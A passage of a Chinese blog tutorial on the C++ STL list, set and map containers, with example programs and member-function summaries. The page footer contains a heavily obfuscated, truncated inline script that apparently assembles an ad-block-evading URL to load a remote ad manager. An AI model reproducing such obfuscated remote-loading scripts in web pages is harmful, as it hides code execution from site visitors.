   list&lt;int&gt; l3(5,111);//初始化5个元素，每个元素初始值为111
   cout &lt;&lt; "元素个数:" &lt;&lt; l3.size() &lt;&lt; "  " &lt;&lt; *(l3.begin()) &lt;&lt; endl;

   list&lt;int&gt; l4( l3 );//拷贝构造
   cout &lt;&lt; "元素个数:" &lt;&lt; l4.size() &lt;&lt; "  " &lt;&lt; *(l4.begin()) &lt;&lt; endl;

   //不支持[]运算符，因为效率低
   //cout &lt;&lt; l4[0] &lt;&lt; endl;

   //验证了list容器的内存空间是不连续的
   for (list&lt;int&gt;::iterator   it = l3.begin(); it !=l3.end(); it++)
   {
   	cout &lt;&lt; &amp;(*it) &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   return 0;
}
</code></pre> 
<p><strong>迭代器使用:</strong></p> 
<pre><code>#include&lt;iostream&gt;

#include&lt;list&gt;
using namespace std;

template&lt;class T&gt;
void   Print(T  begin, T  end)
{
   //此处编写代码
   for (T p = begin; p != end; ++p)
   {
   	cout &lt;&lt; *p &lt;&lt; "		";
   }
   cout &lt;&lt; endl;
}

int main()
{ 
   list&lt;int&gt; l3(5, 111);//初始化5个元素，每个元素初始值为111
   cout &lt;&lt; "元素个数:" &lt;&lt; l3.size() &lt;&lt; "  " &lt;&lt; *(l3.begin()) &lt;&lt; endl;

   //验证list容器的迭代器类型（5种之一）
   //双向迭代器bidirectional_iterator_tag
   cout &lt;&lt; typeid(list&lt;int&gt;::iterator::iterator_category).name() &lt;&lt; endl;

   //双向迭代器比随机访问迭代器弱一些，支持  ++  --   !=  ==  =  *   不支持[]  +n -n  +=n  -=n
   list&lt;int&gt;::iterator  it = l3.begin(); //指向容器l3的第一个元素
   cout &lt;&lt; *it &lt;&lt; endl;

   *(++it) =  222;
   *(++it) = 333;
   *(++it) = 444;
   *(++it) = 555;

   ++it;//指向最后一个元素的下一个

   cout &lt;&lt;"迭代器指向末尾的下一个"&lt;&lt; (it == l3.end() )&lt;&lt; endl;

   --it;//指向最后一个元素
   cout &lt;&lt; *it &lt;&lt; endl;

   //it += 3;//不支持
   //it + 3;//不支持
   //it[0];//不支持

   //const_iterator常迭代器，类似于 const  int  *
   list&lt;int&gt;::const_iterator  it2 = l3.cbegin();
   //*it2 = 1;//不能修改常迭代器指向的内容

   //正向遍历
   for (list&lt;int&gt;::iterator it = l3.begin(); it != l3.end(); it++)
   {
   	cout &lt;&lt;  *it &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //反向遍历
   for (list&lt;int&gt;::reverse_iterator it = l3.rbegin(); it != l3.rend(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //测试自己的算法(迭代器带来的好处，算法无需关系容器的具体内存结构，就可以遍历)
   Print&lt;list&lt;int&gt;::iterator&gt;(l3.begin(), l3.end());
   Print(l3.crbegin(), l3.crend());//自己推到迭代器类型

   return 0;
}
</code></pre> 
<p><strong>增加、删除、插入元素:</strong></p> 
<pre><code>#include&lt;iostream&gt;

#include&lt;list&gt;
using namespace std;

int main()
{
   list&lt;int&gt;  l;

   //头部插入一个节点（list容器肯定知道头部的位置）
   l.push_front(111);

   //尾部插入一个节点（list容器肯定知道尾部的位置）
   l.push_back(444);
   l.push_back(555);

   //在某个迭代器的位置之前插入
   l.insert(l.begin(), 222);

   //在某个迭代器的位置之前插入n个相同值元素
   l.insert(l.begin(), 3,333);

   //访问链表第一个元素
   l.front() = 1;
   cout &lt;&lt;"第一个元素:"&lt;&lt; l.front() &lt;&lt; endl; 

   //访问链表最后一个元素
   cout &lt;&lt; "最后一个元素:" &lt;&lt; l.back() &lt;&lt; endl;

   for (list&lt;int&gt;::iterator it = l.begin();  it!= l.end(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "	   ";
   }
   cout &lt;&lt; endl;

   //删除链表头的元素
   l.pop_front();

   //删除链表尾的元素
   l.pop_back();

   //删除某个迭代器指向的元素
   l.erase(l.begin());
    
    //删除一段迭代器区间
   l.erase(l.begin(),l.end());

   //清空链表
   l.clear();

   for (list&lt;int&gt;::iterator it = l.begin(); it != l.end(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "	   ";
   }
   cout &lt;&lt; endl;

   return 0;
}
</code></pre> 
<p><strong>list数据元素插入和删除操作</strong></p> 
<pre><code>push_back(elem);//在容器尾部加入一个元素
pop_back();//删除容器中最后一个元素
push_front(elem);//在容器开头插入一个元素
pop_front();//从容器开头移除第一个元素
insert(pos,elem);//在pos位置插elem元素的拷贝，返回新数据的位置。
insert(pos,n,elem);//在pos位置插入n个elem数据，无返回值。
insert(pos,beg,end);//在pos位置插入[beg,end)区间的数据，无返回值。
clear();//移除容器的所有数据
erase(beg,end);//删除[beg,end)区间的数据，返回下一个数据的位置。
erase(pos);//删除pos位置的数据，返回下一个数据的位置。
remove(elem);//删除容器中所有与elem值匹配的元素。
</code></pre> 
<p><strong>list大小操作</strong></p> 
<pre><code>size();//返回容器中元素的个数
empty();//判断容器是否为空
resize(num);//重新指定容器的长度为num，
若容器变长，则以默认值填充新位置。
如果容器变短，则末尾超出容器长度的元素被删除。
resize(num, elem);//重新指定容器的长度为num，
若容器变长，则以elem值填充新位置。
如果容器变短，则末尾超出容器长度的元素被删除。
</code></pre> 
<p><strong>list赋值操作</strong></p> 
<pre><code>assign(beg, end);//将[beg, end)区间中的数据拷贝赋值给本身。
assign(n, elem);//将n个elem拷贝赋值给本身。
list&amp; operator=(const list &amp;lst);//重载等号操作符
swap(lst);//将lst与本身的元素互换。
</code></pre> 
<p><strong>list数据的存取</strong></p> 
<pre><code>front();//返回第一个元素。
back();//返回最后一个元素。
</code></pre> 
<p><strong>list反转排序</strong></p> 
<pre><code>reverse();//反转链表，比如lst包含1,3,5元素，运行此方法后，lst就包含5,3,1元素。
sort(); //list排序
</code></pre> 
<p></p> 
<p><strong>6.set/multiset容器</strong></p> 
<p></p> 
<p><code>set</code>（集合）是一种每个元素值都是唯一的有序的关联容器。</p> 
<p><code>multiset</code><span style="color:#4d4d4d;"><span style="background-color:#ffffff;">（多重集合）是一种元素值 </span></span><span style="color:#ff0000;">可复的、有序的</span><span style="color:#4d4d4d;"><span style="background-color:#ffffff;"> 关联容器。</span></span></p> 
<p>set/multiset容器内部结构采用<code>红黑树（Red-Black tree）</code>的平衡<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&amp;q=%E4%BA%8C%E5%8F%89%E6%A0%91" title="二叉树">二叉树</a>，它可以在<code>O(logn)</code>时间内</p> 
<p>高效的做查找，插入和删除。</p> 
<p><img alt="img" src="https://images2.imgbox.com/75/71/KVHpwiw3_o.png"></p> 
<p> 基本使用:</p> 
<pre><code>#include&lt;set&gt;
#include&lt;vector&gt;
#include&lt;iostream&gt;

using namespace  std;

int main()
{
   //set 的特点， 值必须唯一， 有序

   set&lt;int&gt; s;//构造空的集合,默认less 升序
   cout &lt;&lt; "元素个数" &lt;&lt; s.size() &lt;&lt; endl;

    set&lt;int&gt;  s2 = {3,2,5,1,4 ,3};//初始化列表
   //set&lt;int, greater&lt;int&gt;&gt;  s2 = {3,2,5,1,4 ,3};//初始化列表,降序
   cout &lt;&lt; "元素个数" &lt;&lt; s2.size() &lt;&lt; endl;

   set&lt;int&gt;  s3(s2.begin(),s2.end()); //拷贝迭代器范围内的元素
   cout &lt;&lt; "元素个数" &lt;&lt; s3.size() &lt;&lt; endl;

   //插入元素 ,成功后返回值的成员second为1，失败为0
   //cout &lt;&lt; typeid(s2.insert(9)).name() &lt;&lt; endl; 
   cout&lt;&lt; s2.insert(9).second &lt;&lt;endl;

   //重复插入元素
   cout &lt;&lt; s2.insert(9).second &lt;&lt; endl;
    
   vector&lt;int&gt; v = {6,7,8,9};
   s2.insert(v.begin(), v.end());//插入其它容器中元素的值

   for (set&lt;int&gt;::iterator   it = s2.begin(); it!=s2.end(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //删除值为6的元素
   s2.erase(6); 

   //删除迭代器指向的元素
   s2.erase(s2.begin());

   for (set&lt;int&gt;::iterator it = s2.begin(); it != s2.end(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //删除迭代器区间
   set&lt;int&gt;::iterator it = s2.begin();
   it++;	it++;	it++;
   s2.erase(s2.begin(), it);

   //s2.clear();//清空集合元素

   for (set&lt;int&gt;::iterator it = s2.begin(); it != s2.end(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //查找集合中的元素 ,找到返回指向该元素的迭代器，否则返回end()
   set&lt;int&gt;::iterator it2 = s2.find(99);
   if (it2 != s2.end())
   {
   	cout &lt;&lt; "找到:" &lt;&lt;*it2&lt;&lt; endl;
   }
   else
   {
   	cout &lt;&lt; "未找到！" &lt;&lt; endl;
   }

   return 0;
}
</code></pre> 
<p><strong>迭代器使用</strong></p> 
<p>STL为<code>set</code>容器提供了相应的迭代器类<code>set&lt;T&gt;::iterator</code>，它是一个<code>双向迭代器（Bidirectional</code></p> 
<p><code>iterator）</code>，以供我们方便的访问容器内部的元素。</p> 
<pre><code>#include&lt;set&gt; 

#include&lt;iostream&gt;
using namespace  std;

template&lt;class T&gt;
void   Print(T  begin, T  end)
{
   for (T p = begin; p != end; ++p)
   {
   	cout &lt;&lt; *p &lt;&lt; "		";
   }
   cout &lt;&lt; endl;
}

int main()
{
   //set 的特点， 值必须唯一， 有序 
   set&lt;int&gt;  s2 = { 3,2,5,1,4,3 };//初始化列表
    
   //输出set迭代器的类别: bidirectional_iterator_tag 双向迭代器
   cout &lt;&lt; typeid(set&lt;int&gt;::iterator::iterator_category).name() &lt;&lt; endl;

   //双向迭代器，支持++ --   *   !=  ==  =  不支持  []  +=n  -=n  +n  -n
   set&lt;int&gt;::iterator it = s2.begin();//获取第一个元素
   cout &lt;&lt;"第一个元素"&lt;&lt; *it &lt;&lt; endl;

    // *it = 111;  //不可更改，说明set中元素值不可改变
   //符合逻辑，因为set中每个元素都已经根据值排列好了大小，此刻你若更改值，顺序无法保证

   ++it;
   cout &lt;&lt; "第二个元素" &lt;&lt; *it &lt;&lt; endl;

   --it;
   cout &lt;&lt;"是否指向开头"&lt;&lt;  (it  ==  s2.begin())&lt;&lt; endl;

   //常迭代器，不可更改指向的元素的内容
   set&lt;int&gt;::const_iterator it2 = s2.cbegin();//获取第一个元素
    // *it2 = 111;  //不可更改set元素中的值

   //验证下， set&lt;int&gt;::iterator 与 set&lt;int&gt;::const_iterator 是一样的
   cout &lt;&lt; typeid(set&lt;int&gt;::iterator ).name() &lt;&lt; endl;
   cout &lt;&lt; typeid(set&lt;int&gt;::const_iterator).name() &lt;&lt; endl;
   
   //正向遍历
   for (set&lt;int&gt;::iterator it = s2.begin(); it != s2.end(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //反向遍历
   for (set&lt;int&gt;::reverse_iterator it = s2.rbegin(); it != s2.rend(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //测试自定义的Print算法(迭代器，算法无需关心容器的内存结构)
   Print&lt;set&lt;int&gt;::iterator&gt;(s2.begin(), s2.end());
   return 0;
}
</code></pre> 
<p><strong>set赋值操作</strong></p> 
<pre><code>set&amp; operator=(const set &amp;st);//重载等号操作符
swap(st);//交换两个集合容器
</code></pre> 
<p><strong>set大小操作</strong></p> 
<pre><code>size();//返回容器中元素的数目
empty();//判断容器是否为空
</code></pre> 
<p><strong>set插入和删除操作</strong></p> 
<pre><code>insert(elem);//在容器中插入元素。
clear();//清除所有元素
erase(pos);//删除pos迭代器所指的元素，返回下一个元素的迭代器。
erase(beg, end);//删除区间[beg,end)的所有元素 ，返回下一个元素的迭代器。
erase(elem);//删除容器中值为elem的元素。
</code></pre> 
<p><strong>set查找操作</strong></p> 
<pre><code>find(key);//查找键key是否存在,若存在，返回该键的元素的迭代器；若不存在，返回set.end();
count(key);//查找键key的元素个数
lower_bound(keyElem);//返回第一个key&gt;=keyElem元素的迭代器。
upper_bound(keyElem);//返回第一个key&gt;keyElem元素的迭代器。
equal_range(keyElem);//返回容器中key与keyElem相等的上下限的两个迭代器。
</code></pre> 
<p></p> 
<p><strong>7.map/multimap容器</strong></p> 
<p style="margin-left:0;"><span style="color:#4d4d4d;"><span style="background-color:#ffffff;"><code>map</code>（映射）是一种存储键值（<code>key-value</code>）对， <span style="color:#ff0000;">key是唯一的、有序的</span> 关联容器。</span></span></p> 
<p style="margin-left:0;"><code>multimap</code><span style="color:#4d4d4d;"><span style="background-color:#ffffff;">（多重映射）是一种存储键值（key-vauekey是 </span></span><span style="color:#ff0000;">允许重复的、有序的</span><span style="color:#4d4d4d;"><span style="background-color:#ffffff;"> 关联容器。</span></span></p> 
<p style="margin-left:0;"><span style="color:#4d4d4d;"><span style="background-color:#ffffff;"><code>map</code>内部结构采用<code>红黑树（Red-Black tree）</code>平衡二叉树，它可以在<code>O(log n)</code>时间内高效的做查</span></span></p> 
<p style="margin-left:0;"><span style="color:#4d4d4d;"><span style="background-color:#ffffff;">找，插入和删除。</span></span></p> 
<p>Map和list拥有相同的某些性质，当对它的容器元素进行新增操作或者删除操作时，操作之前的所</p> 
<p>有迭代器，在操作完成之后依然有效，当然被删除的那个元素的迭代器必然是个例外。</p> 
<p>Multimap和map的操作类似，唯一区别multimap键值可重复。</p> 
<p><img alt="img" src="https://images2.imgbox.com/b9/b0/Fgf7yiAM_o.png"></p> 
<p><strong> 基本使用 </strong></p> 
<pre><code>#include&lt;map&gt;

#include&lt;iostream&gt;
using namespace  std;

int main()
{
   //map映射 ，  每个元素都是 key-value 键值对，  key不能重复，value可以，有序的
   map&lt;int, string&gt;  m;//构造空的map
   cout &lt;&lt;"元素个数："&lt;&lt; m.size() &lt;&lt; endl;

   //初始化列表构造map
   map&lt;int, string&gt;  m2 = { {3,"CCC"} ,  {1,"AAA"} ,  {2,"BBB"} };
   cout &lt;&lt; "元素个数：" &lt;&lt; m2.size() &lt;&lt; endl;

   //拷贝构造
   map&lt;int, string&gt;  m3(m2);
   cout &lt;&lt; "元素个数：" &lt;&lt; m3.size() &lt;&lt; endl;

   //验证map容器中的元素类型   pair&lt;int, string&gt;
   cout &lt;&lt; typeid(map&lt;int, string&gt;::value_type).name() &lt;&lt; endl;

   //一对值  pair 类模板
   pair&lt;int, float&gt;  p1;
   p1.first = 1;
   p1.second = 2.34f;

   pair&lt;int, float&gt;  p2(2, 3.45f); //有参构造
   cout &lt;&lt; "first: " &lt;&lt; p2.first &lt;&lt; "     second:" &lt;&lt; p2.second&lt;&lt; endl;

   //使用make_pair函数构造pair
   pair&lt;short, char&gt;  p3 = make_pair&lt;short, char&gt;(3, 'A');
   //pair&lt;short, char&gt;  p3 = make_pair(3, 'A');//自动推导
   cout &lt;&lt; "first: " &lt;&lt; p3.first &lt;&lt; "     second:" &lt;&lt; p3.second &lt;&lt; endl;


   map&lt;int, string&gt;  m4 = {   pair&lt;int, string&gt;( 3,"CCC" )   ,  make_pair( 2,"BBB"),  make_pair(1,"AAA"), };
   cout &lt;&lt; "元素个数：" &lt;&lt; m4.size() &lt;&lt; endl;

   return 0;
}
</code></pre> 
<p><strong>插入、删除元素</strong></p> 
<pre><code>#include&lt;vector&gt;
#include&lt;map&gt;

#include&lt;iostream&gt;
using namespace  std;

int main()
{
   //map映射 关联容器 ，  每个元素都是 key-value 键值对  pair， 
   //key不能重复，value可以， 有序的
   map&lt;int, string&gt;  m;//构造空的map 

   //插入pair
   pair&lt;int, string&gt;  p1(2, "BBB");
   m.insert(p1);
    
   m.insert(pair&lt;int, string&gt;(1, "AAA"));

   //可以通过insert返回值的 成员.second查看是否插入成功，true成功，false是失败
   m.insert( make_pair&lt;int, string&gt;(2, "bbb")); //插入重复的key, 插入失败
   m.insert(make_pair(3, "CCC")); 

   // 插入其它容器中迭代器范围中的元素
   vector&lt;pair&lt;int, string&gt;&gt;  v = { {3,"ccc"}, {5, "EEE"},{ 4,"DDD" },{6, "FFF"} };
   m.insert(v.begin(), v.end());

   //[key]= value 
   m[7] = "GGG"; //对于不存在的key， 插入，相当于 (7,"GGG") 
   m[8];  //对于不存在的key，插入，相当于 ( 8,"")
   m[2] = "bbb";// 已经存在的key，相当于是修改元素的value

   for (map&lt;int, string&gt;::iterator  it = m.begin(); it!= m.end(); ++it)
   {
   	cout &lt;&lt; it-&gt;first &lt;&lt; "-&gt;" &lt;&lt; it-&gt;second.c_str() &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //查找key为3的元素，成功返回迭代器，失败返回end()
   {
   	map&lt;int, string&gt;::iterator  it = m.find(33);
   	if (it != m.end())
   	{
   		cout &lt;&lt; "找到：" &lt;&lt; it-&gt;first &lt;&lt; "-&gt;" &lt;&lt; it-&gt;second.c_str() &lt;&lt; endl;
   	}
   	else
   	{
   		cout &lt;&lt; "未找到!" &lt;&lt; endl;
   	}
   }

   //[key] 如果key存在，直接返回value
   //陷阱 ,如果key不存在，他会自动插入key，value为默认值再返回
   cout &lt;&lt; "[key] "&lt;&lt; m[33].c_str() &lt;&lt; endl;
    
   for (map&lt;int, string&gt;::iterator it = m.begin(); it != m.end(); ++it)
   {
   	cout &lt;&lt; it-&gt;first &lt;&lt; "-&gt;" &lt;&lt; it-&gt;second.c_str() &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //删除key为3的元素
   m.erase(3); 

   //删除某个迭代器指向的元素
   m.erase(m.begin());

   //删除迭代器区间[)的元素
   map&lt;int, string&gt;::iterator it = m.begin();
   ++it; ++it; ++it; //往后移动
   m.erase(m.begin(), it); 

   //删除所有元素
   m.clear();

   for (map&lt;int, string&gt;::iterator it = m.begin(); it != m.end(); ++it)
   {
   	cout &lt;&lt; it-&gt;first &lt;&lt; "-&gt;" &lt;&lt; it-&gt;second.c_str() &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   return 0;
}
</code></pre> 
<p><strong>迭代器使用</strong></p> 
<p>STL为<code>map</code>容器提供了相应的迭代器类<code>map&lt;T1,T2&gt;::iterator</code>，它是一个<code>双向迭代器</code></p> 
<p><code>（Bidirectional iterator）</code>以供我们方便的访问容器内部的元素。</p> 
<pre><code>#include&lt;map&gt;

#include&lt;iostream&gt;
using namespace  std;

template&lt;class T&gt;
void   Print(T  begin, T  end)
{
   for (T p = begin; p != end; ++p)
   {
   	cout &lt;&lt; *p &lt;&lt; "		";
   }
   cout &lt;&lt; endl;
}

//为   map&lt;int, string&gt;元素类型提供 &lt;&lt;运算符重载
ostream  &amp;  operator&lt;&lt;(ostream  &amp;  os, map&lt;int, string&gt;::value_type   &amp;p)
{
   cout &lt;&lt; p.first &lt;&lt; "-&gt;" &lt;&lt; p.second.c_str() ;
   return  os;
}

int main()
{
   //map映射 关联容器 ，  每个元素都是 key-value 键值对  pair， 
   //key不能重复，value可以， 有序的
   map&lt;int, string&gt;  m;//构造空的map  
   m.insert(make_pair(3, "CCC"));
   m.insert(make_pair(1, "AAA"));	m.insert(make_pair(2, "BBB")); 
    
   //map&lt;int, string&gt;::iterator是双向迭代器 bidirectional_iterator_tag
   cout &lt;&lt; typeid(map&lt;int, string&gt;::iterator::iterator_category).name() &lt;&lt; endl;

   //双向迭代器，支持  ++  --  *   =    !=   == ，  不支持   [] 、+=n， -=n  +n  -n
   map&lt;int, string&gt;::iterator  it = m.begin();
   // it-&gt;first = 111; //map的key值不允许修改, map是按照key排好序的，如果你更改key值，会打乱顺序
    it-&gt;second = "aaa"; //map的value允许修改

    ++it;
    cout &lt;&lt; it-&gt;first &lt;&lt; "-&gt;" &lt;&lt; it-&gt;second.c_str() &lt;&lt;endl;

    --it;
    cout &lt;&lt; "回到开头"&lt;&lt;(it == m.begin()) &lt;&lt; endl;
      
    //const_iterator 指向的元素内容不可修改
    map&lt;int, string&gt;::const_iterator  it2 = m.begin();
   // it2-&gt;first = 111; //均不可修改
   // it2-&gt;second = "aaa";//均不可修改

    //查看两种iterator的真实类型
    cout &lt;&lt; typeid(map&lt;int, string&gt;::iterator).name() &lt;&lt; endl;
    cout &lt;&lt; typeid(map&lt;int, string&gt;::const_iterator).name() &lt;&lt; endl;
     
    //正向遍历
   for (map&lt;int, string&gt;::iterator it = m.begin(); it != m.end(); ++it)
   {
   	cout &lt;&lt; it-&gt;first &lt;&lt; "-&gt;" &lt;&lt; it-&gt;second.c_str() &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;
      
   //反向遍历
   for (map&lt;int, string&gt;::reverse_iterator it = m.rbegin(); it != m.rend(); ++it)
   {
   	cout &lt;&lt; it-&gt;first &lt;&lt; "-&gt;" &lt;&lt; it-&gt;second.c_str() &lt;&lt; "   ";
   }
   cout &lt;&lt; endl;

   //使用Print ，无需知道map的内部结构，通过迭代器就可以遍历map的所有元素

   Print&lt;map&lt;int, string&gt;::iterator&gt;(m.begin(), m.end());

   return 0;
}
</code></pre> 
<p><strong>map赋值操作</strong></p> 
<pre><code>map&amp; operator=(const map &amp;mp);//重载等号操作符
swap(mp);//交换两个集合容器
</code></pre> 
<p><strong>map大小操作</strong></p> 
<pre><code>size();//返回容器中元素的数目
empty();//判断容器是否为空
</code></pre> 
<p><strong>map插入数据元素操作</strong></p> 
<pre><code>map.insert(...); //往容器插入元素，返回pair&lt;iterator,bool&gt;
map&lt;int, string&gt; mapStu;
// 第一种 通过pair的方式插入对象
mapStu.insert(pair&lt;int, string&gt;(3, "小张"));
// 第二种 通过pair的方式插入对象
mapStu.inset(make_pair(-1, "校长"));
// 第三种 通过value_type的方式插入对象
mapStu.insert(map&lt;int, string&gt;::value_type(1, "小李"));
// 第四种 通过数组的方式插入值
mapStu[3] = "小刘";
mapStu[5] = "小王";
</code></pre> 
<p><strong>map删除操作</strong></p> 
<pre><code>clear();//删除所有元素
erase(pos);//删除pos迭代器所指的元素，返回下一个元素的迭代器。
erase(beg,end);//删除区间[beg,end)的所有元素 ，返回下一个元素的迭代器。
erase(keyElem);//删除容器中key为keyElem的对组。
</code></pre> 
<p><strong>map查找操作</strong></p> 
<pre><code>find(key);//查找键key是否存在,若存在，返回该键的元素的迭代器；/若不存在，返回map.end();
count(keyElem);//返回容器中key为keyElem的对组个数。对map来说，要么是0，要么是1。对multimap来说，值可能大于1。
lower_bound(keyElem);//返回第一个key&gt;=keyElem元素的迭代器。
upper_bound(keyElem);//返回第一个key&gt;keyElem元素的迭代器。
equal_range(keyElem);//返回容器中key与keyElem相等的上下限的两个迭代器。
</code></pre> 
<p></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/786cc5bb2faa53912af970255588f5df/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">C语言入门01—软件配置</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/fd8e44c6da4eb7d4a839df84a4360ed9/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">更好、更快、更强的多任务全景感知YOLOPv2，目标检测、freespace、车道线检测</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(